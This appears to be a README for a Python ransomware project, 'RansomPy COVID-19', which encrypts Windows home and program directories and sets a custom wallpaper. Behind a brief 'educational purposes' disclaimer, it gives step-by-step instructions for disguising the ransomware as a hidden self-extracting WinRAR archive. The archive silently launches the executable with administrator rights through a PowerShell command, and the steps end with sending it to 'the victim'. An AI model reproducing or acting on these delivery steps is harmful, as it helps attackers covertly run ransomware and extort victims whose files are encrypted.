RansomPy COVID-19

Ransowmare based on Python 3 You can find the source of the base code in the directory of : https://github.com/pycodehacker/pysome

This version is improved and I decided to add specific directories to encrypt. As well as adding a custom wallpaper

The code is constantly improving, this for educational purposes to learn how a Ransomware works. I am in no way responsible for what you will do with this code.

#Program Operation

The code is buildable in several stages but is essentially intended to encrypt the files in a Windows system and is compiled with Cx_Freeze which allows to import all the Ransomware libraries.

Using Cx_Freeze is relatively simple, you can consult the official documentation at this address: https://cx-freeze.readthedocs.io/en/latest/

You can also execute the code without compiling it, it will be necessary that the target has Python installed on the system, however it is better to compile it for automation after creating an SFX package with Winrar.

#Details

Ransomware does not attack system files, it only encrypts home directories and the directory containing all of the installed programs.

#Auto-exec with WinRAR

Select the folder contains the code and libraries
Rename the folder to "setup"
Right Click and "Add to archive"
Select archive format on "ZIP"
Select "Create SFX Archive"
In the "Advanced tab" click on "SFX Options"
Select "Create in the current folder"
Copy "Powershell Start-Process setup/Ransomware.exe -Verb RunAs" in the "Launch after installation" section.
In the "Advanced tab" on "SFX Options" check the box "Request Administrative Rights" (Very important, it allows you to run ransomware as an administrator)
In the "Mod tab" on "SFX Options" check the box "Hide Everything"
In the "Update tab" on "SFX Options" check the box "Replace all files"
Click OK
Send the "SFX Archive" to the victim.
The advantage of this method of building an archive is that I do not need to request privileges in the code and it also makes it possible to contain all the libraries in a single executable file.
